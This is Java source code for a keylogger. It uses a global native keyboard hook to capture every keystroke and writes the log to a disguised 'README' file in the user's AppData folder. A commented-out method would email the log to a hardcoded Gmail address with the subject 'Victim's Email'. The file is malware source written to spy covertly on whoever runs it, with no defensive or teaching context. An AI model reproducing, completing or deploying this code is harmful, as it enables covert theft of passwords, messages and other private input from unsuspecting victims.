import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.PrintWriter;
import javax.swing.JFrame;
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import java.util.*;
import javax.mail.*;
import javax.mail.internet.*;
import javax.activation.*;
import javax.mail.Session;
import javax.mail.Transport;
import java.net.InetAddress;
import java.net.UnknownHostException;

public class KeyLogger extends JFrame implements ActionListener, NativeKeyListener
{
	public static String username = System.getProperty("user.name");
	public static File file = new File("C:\\Users\\" + username + "\\AppData\\Local\\Programs\\Common\\README");
	public static String sent = "";
	String to = "lvwelk66@gmail.com";	
	String from = "lvwelk@gmail.com";

	public static void main(String[] args)
	{
	}
	
	public void KEY()
	{
		try  
		{
			GlobalScreen.registerNativeHook();
		} 
		catch (NativeHookException e1) 
		{
			e1.printStackTrace();
		}
				GlobalScreen.addNativeKeyListener(new KeyLogger());
	}
	
	public void nativeKeyPressed(NativeKeyEvent e)
	{	
		if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Escape")) 
		{
			sent = sent + "";
			try 
			{
				Writer(sent);
				System.exit(0);
			} 
			catch (FileNotFoundException e1) 
			{
				e1.printStackTrace();
			}
		} 
		else if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Space")) 
		{
			sent = sent + " ";
		} 
		else if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Enter")) 
		{
			sent = sent + " ";
		} 
		else if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Comma")) 
		{
			sent = sent + ",";
		} 
		else if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Semicolon")) 
		{
			sent = sent + ":";
		} 
		else if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Shift")) 
		{
			sent = sent + "^";
		}
		else if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Back Quote")) 
		{
			sent = sent + "`";
		}
		else if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Minus")) 
		{
			sent = sent + "-";
		}
		else if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Equals")) 
		{
			sent = sent + "=";
		}
		else if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Backspace")) 
		{
			sent = sent + " [D] "; //sent.substring(0, sent.length()-1);;
		}
		else if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Tab")) 
		{
			sent = sent + "";
		}
		else if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Open Bracket")) 
		{
			sent = sent + "[";
		}
		else if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Close Bracket")) 
		{
			sent = sent + "]";
		}
		else if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Back Slash")) 
		{
			sent = sent + '\'';
		}
		else if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Caps Lock")) 
		{
			sent = sent + "";
		}
		else if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Quote")) 
		{
			sent = sent + "'";
		}
		else if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Period")) 
		{
			sent = sent + ".";
		}
		else if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Slash")) 
		{
			sent = sent + "/";
		}
		else if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Unknown keyCode: 0xe36")) 
		{
			sent = sent + "^";
		}
		else if (NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Ctrl") || NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Meta") || NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Alt") || NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Context Menu") || NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Left") || NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Down") || NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Right") || NativeKeyEvent.getKeyText(e.getKeyCode()).equals("Up")) 
		{
			sent = sent + "";
		}
		else 
		{
			sent = sent.toLowerCase() + NativeKeyEvent.getKeyText(e.getKeyCode());
		}
		
		
	}
	public void Writer(String str) throws FileNotFoundException
	{
		PrintWriter pw = new PrintWriter(file);
		pw.print(str);
		pw.flush();
		pw.close();
	}
	
//	private void Email(String str) throws UnknownHostException 
//	{	
//		String host = "localhost";
//		Properties properties = System.getProperties();
//		properties.setProperty("mail.smtp.host", host);
//		Session session = Session.getDefaultInstance(properties);
//		
//		try
//	      {
//	         MimeMessage message = new MimeMessage(session);
//	         message.setFrom(new InternetAddress(from));
//	         message.addRecipient(Message.RecipientType.TO, new InternetAddress(to));
//	         message.setSubject("Victim's Email");
//	         message.setText(str);
//	         Transport.send(message);
//	      }
//	      catch (MessagingException mex)
//	      {
//	         mex.printStackTrace();
//	      }
//		
//	}

	public void nativeKeyReleased(NativeKeyEvent e)
	{
		
	}
	
	public void nativeKeyTyped(NativeKeyEvent e)
	{
		
	}

	

	@Override
	public void actionPerformed(ActionEvent e) 
	{
		
	}

}